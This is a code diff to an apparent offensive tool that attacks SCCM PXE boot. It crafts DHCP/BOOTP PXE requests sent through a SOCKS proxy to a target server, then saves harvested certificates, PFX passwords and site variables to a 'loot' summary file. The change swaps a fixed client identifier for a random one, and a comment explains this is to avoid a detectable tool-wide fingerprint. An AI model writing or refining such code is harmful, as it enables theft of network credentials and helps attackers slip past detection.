@@ -27,7 +27,7 @@ class SCCM:
         self.port = port
         self.socks_client = socks_client
 
-    def _craft_packet(self, client_ip, client_mac):
+    def _craft_packet(self, client_ip, client_mac, machine_identifier):
         from scapy.layers.dhcp import BOOTP, DHCP
 
         pkt = BOOTP(ciaddr=client_ip,chaddr=client_mac)/DHCP(options=[
@@ -37,7 +37,7 @@ class SCCM:
             (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")), #x64 private option
             #(250,binascii.unhexlify("0d0208000e010101020006050400000006ff")), #x86 private option
             ('vendor_class_id', b'PXEClient'),
-            ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), #included by the client, but doesn't seem to be necessary in WDS PXE server configurations
+            ('pxe_client_machine_identifier', machine_identifier), #included by the client, but doesn't seem to be necessary in WDS PXE server configurations
             "end"])
 
         return pkt
@@ -140,7 +140,11 @@ class SCCM:
     def send_bootp_request(self, client_ip, client_mac):
         from scapy.layers.dhcp import BOOTP, DHCP
 
-        self.socks_client.send(bytes(self._craft_packet(client_ip, client_mac)), (self.target, self.port))
+        # Type byte + random GUID — a fixed identifier here would be a static,
+        # tool-wide fingerprint on every PXE boot request.
+        machine_identifier = b"\x00" + os.urandom(16)
+
+        self.socks_client.send(bytes(self._craft_packet(client_ip, client_mac, machine_identifier)), (self.target, self.port))
         data = self.socks_client.recv(9076)
 
         # Load the packet
@@ -312,7 +316,9 @@ class SCCM:
             with open(pfx_path, "wb") as f:
                 f.write(pfx_bytes)
             print(f"[*] Wrote PFX certificate ({len(pfx_bytes)} bytes) to {pfx_path}")
-            print(f"[*] PFX password: {pfx_password}")
+            # First 31 chars of the media GUID, no trailing brace — this is the
+            # full password, not a truncated print; repr() makes that explicit.
+            print(f"[*] PFX password: {pfx_password!r}")
 
         # Write a summary file with all the info needed for next steps
         summary_path = os.path.join(output_dir, "loot_summary.txt")
@@ -320,7 +326,7 @@ class SCCM:
             f.write(f"Management Point: {mp_url}\n")
             f.write(f"Site Code: {site_code}\n")
             f.write(f"Media GUID: {media_guid}\n")
-            f.write(f"PFX Password: {pfx_password}\n")
+            f.write(f"PFX Password: {pfx_password!r}\n")
             f.write(f"PFX File: {pfx_filename if pfx_hex else 'N/A'}\n")
             f.write(f"\nAll Variables:\n")
             for name, value in result.items():
